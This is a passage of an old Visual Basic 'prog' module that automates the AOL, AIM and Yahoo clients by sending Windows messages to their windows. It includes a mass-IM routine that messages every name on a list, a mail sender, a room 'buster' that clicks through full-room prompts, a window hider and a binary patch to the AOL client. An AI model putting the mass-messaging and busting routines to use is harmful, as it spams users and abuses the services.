    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        OpenSend& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
       If AOL_VerzioN = 4 Then
       For doit& = 1 To 13
       SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
       Next doit&
       ElseIf AOL_VerzioN = 5 Then
       For doit& = 1 To 14
       SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
       Next doit&
       End If
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
    If filer$ = "" Then GoTo nex Else Call Attach(filer$)

    DoEvents
    TimeOut (1)
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, peepz$)
    DoEvents
    Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, subject$)
    DoEvents
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, message$)
    DoEvents
nex:
TimeOut (0.5)
DoEvents
TimeOut 0.4
Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
timer2.Enabled = True
End Sub
Public Function setmailprefs()
'im rollin through anuva neighbuhhood,
'me n my boyz, up to no good-

    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, mPrefs As Long, mButton As Long
    Dim gStatic As Long, mStatic As Long, fStatic As Long
    Dim maStatic As Long, dMod As Long, ConfirmCheck As Long
    Dim CloseCheck As Long, SpellCheck As Long, OKButton As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 3
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        mPrefs& = FindWindowEx(MDI&, 0&, "AOL Child", "Preferences")
        gStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "General")
        mStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Mail")
        fStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Font")
        maStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Marketing")
    Loop Until mPrefs& <> 0& And gStatic& <> 0& And mStatic& <> 0& And fStatic& <> 0& And maStatic& <> 0&
    mButton& = FindWindowEx(mPrefs&, 0&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    Do
        DoEvents
        Call SendMessage(mButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(mButton&, WM_LBUTTONUP, 0&, 0&)
        dMod& = FindWindow("_AOL_Modal", "Mail Preferences")
        pause 0.6
    Loop Until dMod& <> 0&
    ConfirmCheck& = FindWindowEx(dMod&, 0&, "_AOL_Checkbox", vbNullString)
    CloseCheck& = FindWindowEx(dMod&, ConfirmCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, CloseCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    OKButton& = FindWindowEx(dMod&, 0&, "_AOL_icon", vbNullString)
    Call SendMessage(ConfirmCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(CloseCheck&, BM_SETCHECK, True, vbNullString)
    Call SendMessage(SpellCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Call PostMessage(mPrefs&, WM_CLOSE, 0&, 0&)
End Function








Function AIM_HideAIM()
Dim aim As Long, HideIt As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
HideIt& = ShowWindow(aim&, SW_HIDE)
End Function

Function Win_GetCap(ByVal lWinHandle As Long) As String
'This gets the title of any window.
    Dim lWinLength As Long, stCap As String
    lWinLength = GetWindowTextLength(lWinHandle)
    stCap$ = String(lWinLength&, 0&)
    Call GetWindowText(lWinHandle&, stCap$, lWinLength& + 1)
    Win_GetCap$ = stCap$
End Function
Sub AIM_RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For getString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next getString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub
Function AIM_ChangeIMCaption(caption$)
Dim caption1 As Long, captionchange As Long
caption1& = FindWindow("AIM_IMessage", vbNullString)
captionchange& = SendMessageByString(caption1&, WM_SETTEXT, 0, caption$)
End Function

Function AIM_GetIMCaptioN()
Dim caption1 As Long, captionchange As Long
caption1& = FindWindow("AIM_IMessage", vbNullString)
AIM_GetIMCaptioN = gettext(caption1&)
End Function

Function AIM_ImFromWho() As String
    On Error Resume Next
    String1$ = Win_GetCap(AIM_FindIM&)
    AIM_ImFromWho$ = Left(String1$, Len(String1$) - 18)
    
End Function
Function AIM_ChangeAIMCaption(caption$)
Dim caption1 As Long, captionchange As Long
caption1& = FindWindow("_Oscar_BuddyListWin", vbNullString)
captionchange& = SendMessageByString(caption1&, WM_SETTEXT, 0, caption$)
End Function
Function AIM_ShowAIM()
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Showit& = ShowWindow(aim&, SW_SHOW)
End Function

Function AIM_ChangeChatCaption(caption$)
Dim caption1 As Long, captionchange As Long
caption1& = FindWindow("AIM_ChatWnd", vbNullString)
captionchange& = SendMessageByString(caption1&, WM_SETTEXT, 0, caption$)
End Function


Function Win_GetTxt(ByVal lWinHandle As Long) As String
'This gets the text of any object
    Dim tWinLength As Long, stTxt As String
    tWinLength = SendMessage(lWinHandle, WM_GETTEXTLENGTH, 0&, 0&)
    stTxt$ = String(tWinLength&, 0&)
    Call SendMessageByString(lWinHandle&, WM_GETTEXT, tWinLength& + 1, stTxt$)
    Win_GetTxt$ = stTxt$
End Function

Function AIM_Who() As String
    On Error Resume Next
    stringChat$ = Who
    If InStr(1, stringChat$, ":") = 0 Then
    AIM_Who$ = "None"
    End If
    
    lColon& = InStr(1, stringChat$, ": ")
    AIM_Who$ = Right(stringChat$, Len(stringChat$) - lColon& - 1)
End Function
Function AIM_SayRoomName()
AIM_SendChat "You iz in room """ + AIM_GetChatName + "."""
End Function


Function AIM_SendChat(message$)


Dim chat As Long, box As Long, Box2 As Long, Box3 As Long, send As Long, send2 As Long, send3 As Long, send4 As Long
chat& = FindWindow("AIM_ChatWnd", vbNullString)
box& = FindWindowEx(chat&, 0&, "WndAte32Class", vbNullString)
Box2& = FindWindowEx(chat&, box&, "WndAte32Class", vbNullString)
Box3& = SendMessageByString(Box2&, WM_SETTEXT, 0, message$)
send& = FindWindowEx(chat&, 0&, "_Oscar_IconBtn", vbNullString)
send2& = FindWindowEx(chat&, send&, "_Oscar_IconBtn", vbNullString)
send3& = FindWindowEx(chat&, send2&, "_Oscar_IconBtn", vbNullString)
send4& = FindWindowEx(chat&, send3&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (send4&)

End Function
Function AIM_SendIM(Who$, message$)
Dim aim As Long, Group As Long, Button As Long, IM As Long, IMcombo As Long, IMto As Long, IMmessage As Long, send As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(aim&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (Button&)
IM& = FindWindow("AIM_IMessage", vbNullString)
IMcombo& = FindWindowEx(IM&, 0&, "_Oscar_PersistantCombo", vbNullString)
IMto& = FindWindowEx(IMcombo&, 0&, "Edit", vbNullString)
Call SendMessageByString(IMto&, WM_SETTEXT, 0, Who$)
IMmessage& = FindWindowEx(IM&, 0&, "WndAte32Class", vbNullString)
IMmessage& = GetWindow(IMmessage&, 2)
Call SendMessageByString(IMmessage&, WM_SETTEXT, 0, message$)
send& = FindWindowEx(IM&, 0&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (send&)
End Function
Function Yahoo_SendIM(message$)
'ouwop
Dim aim As Long, Group As Long, Button As Long, IM As Long, IMcombo As Long, IMto As Long, IMmessage As Long, send As Long
aim& = FindWindow("yahoobuddymain", vbNullString)
Group& = FindWindowEx(aim&, 0&, "systabcontrol32", vbNullString)
Button& = FindWindowEx(Group&, 0&, "pagertoolbar", vbNullString)
cLickiCoN (Button&)
IM& = FindWindow("imclass", vbNullString)
IMcombo& = FindWindowEx(IM&, 0&, "richedit", vbNullString)
IMmessage& = GetWindow(IMcombo&, 2)
Call SendMessageByString(IMmessage&, WM_SETTEXT, 0, message$)
send& = FindWindowEx(IM&, 0&, "button", vbNullString)
Clicker (send&)
End Function

Function Yahoo_FINDIM()
'ouwop
Dim aim As Long, Group As Long, Button As Long, IM As Long, IMcombo As Long, IMto As Long, IMmessage As Long, send As Long
aim& = FindWindow("yahoobuddymain", vbNullString)
Group& = FindWindowEx(aim&, 0&, "systabcontrol32", vbNullString)
Button& = FindWindowEx(Group&, 0&, "pagertoolbar", vbNullString)
IM& = FindWindow("imclass", vbNullString)
If IM& <> 0& Then Yahoo_FINDIM = 1 Else Yahoo_FINDIM = 0

End Function

Function AIM_ShowAd()
Dim part1 As Long, part2 As Long, Showit As Long
part1& = FindWindow("_Oscar_BuddyListWin", vbNullString)
part2& = FindWindowEx(part1&, 0&, "WndAte32Class", vbNullString)
Showit& = ShowWindow(part2&, SW_SHOW)
End Function

Function AIM_openIM()
Dim aim As Long, Group As Long, Button As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Group& = FindWindowEx(aim&, 0&, "_Oscar_TabGroup", vbNullString)
Button& = FindWindowEx(Group&, 0&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (Button&)
End Function


Function AIM_MassIM_FAZT(lbl5 As Label, tmr As Timer, lbl As Label, list As ListBox, message As String)
'ouwop
If list.listcount = 0 Then
Do: DoEvents: Loop
End If
list.Enabled = False
i = list.listcount - 1
list.ListIndex = 0

For X = 0 To i
list.ListIndex = "0"
 gh$ = list.listcount
'If Gh$ > "15" Then
lbl.caption = "Statuz: " + AIM_UserSN + " <><ing " + list
If lbl5.caption = "m" Then Exit Function
Call AIM_SendIM(list.Text, message)
If gh$ = gh$ - "10" Then TimeOut (8)
On Error Resume Next
list.RemoveItem list.ListIndex
AIM_CloseIM
AIM_CloseIM
Next X
list.Enabled = True

lbl.caption = "Statuz: " + AIM_UserSN + " not <>< ing"


End Function









Sub AIM_maxchat()
mi = ShowWindow(AIM_FindChatRoom, SW_MAXIMIZE)
End Sub


Public Sub AIM_addroom(objBox As Object, blnAddYourself As Boolean)
    DoEvents:
    On Error Resume Next
    If AIM_FindChatRoom <> 0 Then
    Do Until BuddyTree& <> 0
    BuddyTree& = FindWindowEx(AIM_FindChatRoom, 0, "_Oscar_Tree", vbNullString)
    Loop
    End If
    Count& = SendMessage(BuddyTree&, LB_GETCOUNT, 0, 0)
    For intLoop% = 0 To Count& - 1
    lLength& = SendMessage(BuddyTree&, LB_GETTEXTLEN, intLoop%, 0)
    lEmptyT$ = String(lLength&, " ")
    
    lFullTe$ = SendMessageByString(BuddyTree&, LB_GETTEXT, intLoop%, lEmptyT$)
    lTab& = InStr(lEmptyT$, Chr(9)) 'Find Tab.
    sName$ = Right$(lEmptyT$, Len(lEmptyT$) - lTab&)

    lTab& = InStr(sName$, Chr(9))
    sText$ = Right$(sName$, Len(sName$) - lTab&)
    sName2$ = sText$
    
    If blnAddYourself = False And sName2$ = AIM_UserSN Then Else: _
    objBox.AddItem (sName2$)
    Next intLoop%
End Sub
Function AIM_Attention(message$)
d$ = ASCII_Random
AIM_SendChat d$ + "Attention" + d$
AIM_SendChat message$
AIM_SendChat d$ + "Attention" + d$
End Function

Sub PlayWaV2(Wav$)
SoundName$ = file
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   X% = sndPlaySound(SoundName$, wFlags%)

End Sub

Function AIM_GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)

AIM_GetClass = buffer$
End Function

Function AIM_GoToWebPage(page$)
Dim aim As Long, box As Long, Go As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
box& = FindWindowEx(aim&, 0&, "Edit", vbNullString)
Call SendMessageByString(box&, WM_SETTEXT, 0, page$)
Go& = FindWindowEx(aim&, 0&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (Go&)
End Function
Function AIM_PR_Enter(room$)
'ouwop
Dim aim As Long, box As Long, Go As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
box& = FindWindowEx(aim&, 0&, "Edit", vbNullString)
Call SendMessageByString(box&, WM_SETTEXT, 0, "aim:gochat?roomname=" + room$)
Go& = FindWindowEx(aim&, 0&, "_Oscar_IconBtn", vbNullString)
cLickiCoN (Go&)
Call SendMessageByString(box&, WM_SETTEXT, 0, "Search da Web")
End Function

Public Sub AIM_CloseIM()
    DoEvents:
    lIm& = AIM_FindIM&
    If lIm& > 0 Then
    Call Win_Close(lIm&)
    End If
End Sub


Public Sub AIM_CloseIMs()
DoEvents:
 If findiM& > 0 Then
    Do Until AIM_FindIM& = 0
      Call Win_Close(AIM_FindIM&)
    Loop
    End If
End Sub

Function AIM_Close_info() As Long
    DoEvents:
    mess% = FindWindow("Information", vbNullString)
AOL4_KillWin (mess%)
End Function

Function AIM_FindIM() As Long
   DoEvents:
   lMess& = FindWindow("AIM_IMessage", vbNullString)
   If lMess& = 0 Then bChat = False Else: bChat = True
   AIM_FindIM& = lMess&

End Function

Function AIM_Find_FSN() As Long
    DoEvents:
    lMess& = FindWindow("#32770", vbNullString)
    If lMess& = 0 Then bChat = False Else: bChat = True
     AIM_Find_FSN& = lMess&

End Function



Function Win_Replace(stText As String, stToReplace As String, stReplaceWith As String) As String
'This finds any char/word you want in a text and replaces it
'With what you want. I'm going to use if for my second HTML
'Filter

    On Error Resume Next
    For intLoop% = 1 To Len(stText)
        
    lFindChar& = InStr(1, LCase(stText$), LCase(stToReplace$))
    If lFindChar& = 0 Then
    Win_Replace$ = stText$
    Exit Function
    End If
    

    lFindChar& = InStr(1, LCase(stText$), LCase(stToReplace$))
    strCharL$ = Left(stText$, lFindChar& - 1)
    strCharR$ = Right(stText$, Len(stText$) - (lFindChar& + Len(stToReplace$) - 1))
    strCharF$ = strCharL$ + stReplaceWith$ + strCharR$
    stText$ = strCharF$
        
    Next intLoop%
    Win_Replace$ = strCharF$
End Function










Function ASCII_Random()
 'ouwop
    Dim ascii
    Randomize
    ascii = Int(123 * Rnd + 1)
If ascii = 1 Then a$ = "[`·¸]"
If ascii = 2 Then a$ = "[¸·´]"
If ascii = 3 Then a$ = "(•("
If ascii = 4 Then a$ = ")•)"
If ascii = 5 Then a$ = "(•)"
If ascii = 6 Then a$ = ")•("
If ascii = 7 Then a$ = "`·´`·´"
If ascii = 8 Then a$ = "¸.-~·*'˜¨¯"
If ascii = 9 Then a$ = "¨˜'*·~-.¸"
If ascii = 10 Then a$ = "¸·`¯¨˜'*·~-.¸"
If ascii = 11 Then a$ = "¨ '¹i|¡"
If ascii = 12 Then a$ = "¨‘¨ˆ‘°ª·"
If ascii = 13 Then a$ = ",.-·³°¨"
If ascii = 14 Then a$ = "·]¦[·"
If ascii = 15 Then a$ = "•,¸,.·´"
If ascii = 16 Then a$ = "· .¸·´\"
If ascii = 17 Then a$ = "/`·¸. ·"
If ascii = 18 Then a$ = "··¤÷×("
If ascii = 19 Then a$ = ")×÷¤··"
If ascii = 20 Then a$ = "«··÷×)·("
If ascii = 21 Then a$ = ")·(×÷··»"
If ascii = 22 Then a$ = "(¯`·¸["
If ascii = 23 Then a$ = "¸·´¯)"
If ascii = 24 Then a$ = "«·÷·¦["
If ascii = 25 Then a$ = "¦·÷·»"
If ascii = 26 Then a$ = "•···×"
If ascii = 27 Then a$ = "×···•"
If ascii = 28 Then a$ = "(`¨˜°º²"
If ascii = 29 Then a$ = "²º°˜¨´)"
If ascii = 30 Then a$ = "«÷±·´)"
If ascii = 31 Then a$ = "(`·±÷»"
If ascii = 32 Then a$ = "˜¨°ºðØ"
If ascii = 33 Then a$ = "Øðº°¨˜"
If ascii = 34 Then a$ = "¸.´)(`·•||["
If ascii = 35 Then a$ = "•·´)(` .¸"
If ascii = 36 Then a$ = "`·¸][`·÷<l["
If ascii = 37 Then a$ = "l>÷·´][¸·´]"
If ascii = 38 Then a$ = "«·÷´'°ºðØ"
If ascii = 39 Then a$ = "Øðº°'`÷·»"
If ascii = 40 Then a$ = "ðº°¨ð"
If ascii = 41 Then a$ = "ð°ºð"
If ascii = 42 Then a$ = "«·÷´)´)"
If ascii = 43 Then a$ = "(`(`÷·»"
If ascii = 44 Then a$ = "(`·¸_)"
If ascii = 45 Then a$ = "_¸.·´)"
If ascii = 46 Then a$ = "(¸.·´)"
If ascii = 47 Then a$ = "(¸.·´)"
If ascii = 48 Then a$ = "‹›í¦ì‹›"
If ascii = 49 Then a$ = "•÷±/)"
If ascii = 50 Then a$ = "(\±÷•"
If ascii = 51 Then a$ = "(¯`v"
If ascii = 52 Then a$ = "v´¯)"
If ascii = 53 Then a$ = "•v^÷·•"
If ascii = 54 Then a$ = "•·÷^v•"
If ascii = 55 Then a$ = "(`·~^v÷"
If ascii = 56 Then a$ = "÷v^~·´)"
If ascii = 57 Then a$ = "*·._.•÷"
If ascii = 58 Then a$ = "÷•._.·*"
If ascii = 59 Then a$ = "(¯`·._"
If ascii = 60 Then a$ = "_.·´¯)"
If ascii = 61 Then a$ = "(¯`·._"
If ascii = 62 Then a$ = "_.·´¯)"
If ascii = 63 Then a$ = "«­.·´¯`•"
If ascii = 64 Then a$ = "•´¯`·.-»"
If ascii = 65 Then a$ = "‹v÷"
If ascii = 66 Then a$ = "÷v›"
If ascii = 67 Then a$ = "¸.´)(`·["
If ascii = 68 Then a$ = "·´)(` .¸"
If ascii = 69 Then a$ = "·÷±‡±"
If ascii = 70 Then a$ = "±‡±÷·"
If ascii = 71 Then a$ = "´)·(`"
If ascii = 72 Then a$ = "´)·(`"
If ascii = 73 Then a$ = "¨˜°ºð"
If ascii = 74 Then a$ = "ðº°˜¨"
If ascii = 75 Then a$ = "···¤›"
If ascii = 76 Then a$ = "‹¤···"
If ascii = 77 Then a$ = "«··•[]¤)"
If ascii = 78 Then a$ = "(¤[]•··»"
If ascii = 79 Then a$ = "···÷±¦)"
If ascii = 80 Then a$ = "(¦±÷···"
If ascii = 81 Then a$ = "•···¤»"
If ascii = 82 Then a$ = "«¤···•"
If ascii = 83 Then a$ = "–··•)"
If ascii = 84 Then a$ = "(•··–"
If ascii = 85 Then a$ = "¤···¤(•)"
If ascii = 86 Then a$ = "(•)¤···¤"
If ascii = 87 Then a$ = "···÷±|¤"
If ascii = 88 Then a$ = "¤|±÷···"
If ascii = 89 Then a$ = "()··¤"
If ascii = 90 Then a$ = "¤··()"
If ascii = 91 Then a$ = "€¨'·.,•"
If ascii = 92 Then a$ = "•,.·'¨€"
If ascii = 93 Then a$ = "¤··»"
If ascii = 94 Then a$ = "«··¤"
If ascii = 95 Then a$ = "«¤•···/"
If ascii = 96 Then a$ = "\···•¤»"
If ascii = 97 Then a$ = "‹v^•"
If ascii = 98 Then a$ = "•^v›"
If ascii = 99 Then a$ = "•`•¤"
If ascii = 100 Then a$ = "¤•´•"
If ascii = 101 Then a$ = "]•¤"
If ascii = 102 Then a$ = "¤•["
If ascii = 103 Then a$ = "`.·ìÌìÌì"
If ascii = 104 Then a$ = "íÍíÍí·.´"
If ascii = 105 Then a$ = "‹(`·"
If ascii = 106 Then a$ = "·´)›"
If ascii = 107 Then a$ = "‹Ì›"
If ascii = 108 Then a$ = "‹Í›"
If ascii = 109 Then a$ = "`x.¸"
If ascii = 110 Then a$ = "‹«‹¦›»›"
If ascii = 111 Then a$ = "‹í¡í›"
If ascii = 112 Then a$ = "‹íÍí›"
If ascii = 113 Then a$ = "‹íÏì›"
If ascii = 114 Then a$ = "‹íÍí›"
If ascii = 115 Then a$ = "‹íÍì›"
If ascii = 116 Then a$ = ".`·`. `"
If ascii = 117 Then a$ = "´ .´·´."
If ascii = 118 Then a$ = "‹v(·`. "
If ascii = 119 Then a$ = " .´·)v›"
If ascii = 120 Then a$ = "`·`.ÌìÌì• "
If ascii = 121 Then a$ = " •íÍíÍ.´·´"
If ascii = 122 Then a$ = "•¤•"
If ascii = 123 Then a$ = "¤•¤"


ASCII_Random = a$
End Function



Sub INI_WriTe(sAppname$, sKeyName$, sNewString$, blah$)
'Example: INI_WriTE("MazTaprogg", "SN", text.text, app.path + "\Prog.ini")
Dim r As Integer
c$ = STR_Code(sAppname$)
e$ = STR_Code(sNewString$)
f$ = STR_Code(sKeyName$)
r = WritePrivateProfileString(c$, f$, e$, "C:\windows\uzer.ini")

End Sub
Sub INI_WriTe2(sAppname$, sKeyName$, sNewString$, blah$)
'Example: INI_WriTE("MazTaprogg", "SN", text.text, app.path + "\Prog.ini")
Dim r As Integer
r = WritePrivateProfileString(sAppname$, sKeyName$, sNewString$, blah$)
End Sub

Function INI_GeT(AppName$, KeyName$, blah$) As String
'On Error Resume Next
AppName$ = STR_Code(AppName$)
KeyName$ = STR_Code(KeyName$)
   Dim RetStr As String
   RetStr = String(255, Chr(0))
   a$ = (Left(RetStr, GetPrivateProfileString((AppName$), ByVal KeyName$, "", RetStr, Len(RetStr), "C:\windows\uzer.ini")))
INI_GeT = STR_DeCode(a$)
End Function
Function INI_GeT2(AppName$, KeyName$, blah$) As String
'On Error Resume Next
   Dim RetStr As String
   RetStr = String(255, Chr(0))
INI_GeT2 = (Left(RetStr, GetPrivateProfileString(AppName$, ByVal KeyName$, "", RetStr, Len(RetStr), blah$)))
End Function
Function AOL25_ClickNO(times As Label, room$)
'ouwop
'clickz da NO button when asked if you wanna enter a room like it
'and addz the timez it clickz NO to a label for buzterz TIMEZ
top:
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
TimeOut (0.1)
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
aomodal% = FindWindow("_AOL_Modal", vbNullString)
okie% = FindChildByClass(aomodal%, "_aol_button")
okie2% = GetWindow(okie%, GW_HWNDNEXT)
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
If FindWindow("_AOL_Modal", vbNullString) Then times.caption = times.caption + 1
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function
If gettext(okie2%) = "No" Then Call Clicker(okie2%) Else GoTo top
If InStr(LCase(AOL25_GetCurrentRoOmName), LCase(room$)) Then Exit Function

End Function
Function AOL25_FindNO()
'ouwop
'findz da window which Sayz Do you wanna enter a room like it
'good to uze b4 it clickz NO, juz to speed shyt up
'yea diz anuva part of diz dick buzta
aomodal% = FindWindow("_AOL_Modal", vbNullString)
okie% = FindChildByClass(aomodal%, "_aol_button")
okie2% = GetWindow(okie%, GW_HWNDNEXT)
If gettext(okie2%) = "No" Then
AOL25_FindNO = 1
Else
AOL25_FindNO = 0
End If
End Function


Function AOL25_Getuser()
'ouwop

    AOL25_Getuser = getuser

End Function

Sub AOL25_RenameHost(loc, txt)
'aol2.5 only
'ouwop
On Error Resume Next
Open loc For Binary As #1
Seek #1, 6887
Put #1, , txt
Close #1
If Err = 75 Then
MsgBox "Path / File Accezz Err0r!", vbCritical, "Error"
End If
End Sub

Public Function Convert(picSource As PictureBox) As String
    
    Dim lngDoWidth As Long, lngDoHeight As Long
    Dim lngTop As Long, lngBottom As Long
    Dim strchar As String, strline As String
    Dim strMacro As String, lngFix As Long, blnFix As Boolean
    Dim strFinal As String, strTmp As String

    For lngDoHeight& = 1 To picSource.ScaleHeight Step 2
   
        strline$ = ""
        For lngDoWidth& = 1 To picSource.ScaleWidth Step 1
       
            lngTop& = GetPixel(picSource.hdc, lngDoWidth&, lngDoHeight&)
           
            lngBottom& = GetPixel(picSource.hdc, lngDoWidth&, lngDoHeight& + 1&)
           
            If lngTop& = vbWhite And lngBottom& = vbWhite Then
           
                strchar$ = " "
            End If
            If lngTop& <> vbWhite And lngBottom& <> vbWhite Then
          
                strchar$ = ";"
            End If
            If lngTop& = vbWhite And lngBottom& <> vbWhite Then
             
                strchar$ = ","
            End If
            If lngTop& <> vbWhite And lngBottom& = vbWhite Then
               
                strchar$ = "´"
            End If
            If lngTop& = -1 And lngBottom& = -1 Then
               
                strchar$ = " "
            End If
            strline$ = strline$ & strchar$
           
        Next
      
        If Trim(strline$) <> "" Then
            strline$ = RTrim(strline$)
        End If
        If strMacro$ = "" Then
            strMacro$ = strline$
        Else
            strMacro$ = strMacro$ & vbCrLf & strline$
        End If
    Next
    
    blnFix = True
    For lngFix& = 1 To LineCount(strMacro$)
        strline$ = LineFromString(strMacro$, lngFix&)
        strTmp$ = replace(strline$, " ", "")
        strTmp$ = replace(strTmp$, vbCrLf, "")
        If strTmp$ <> "" Then
            blnFix = False
        End If
        If blnFix = False Then
            If strFinal$ = "" Then
                strFinal$ = strline$
            Else
                strFinal$ = strFinal$ & vbCrLf & strline$
            End If
        End If
    Next
    blnFix = True
    strMacro$ = ""
    For lngFix& = LineCount(strFinal$) To 1 Step -1
        strline$ = LineFromString(strFinal$, lngFix&)
        strTmp$ = replace(strline$, " ", "")
        strTmp$ = replace(strTmp$, vbCrLf, "")
        If strTmp$ <> "" Then
            blnFix = False
        End If
        If blnFix = False Then
            If strMacro$ = "" Then
                strMacro$ = strline$
            Else
                strMacro$ = strline$ & vbCrLf & strMacro$
            End If
        End If
    Next
    Convert$ = strMacro$
End Function

Sub Macro_BananNuz()
sendchat ".                  .-.-.                           .-.-."
TimeOut (0.5)
sendchat ".                   \V/                            \V/"
TimeOut (0.5)
sendchat ".                  _|I|_                           _|I|_"
TimeOut (0.5)
sendchat ".                .'     '.                        .'       '."
TimeOut (0.5)
sendchat ".               /         \                      /         \"
TimeOut (0.5)
sendchat ".              :           ;                     :          ;"
TimeOut (0.5)
sendchat ".              |           |                     |           |"
TimeOut (0.5)
sendchat ".              |   0   0  |                     |   0   0 |"
TimeOut (0.5)
sendchat ".              |           |                      |           |"
TimeOut (0.5)
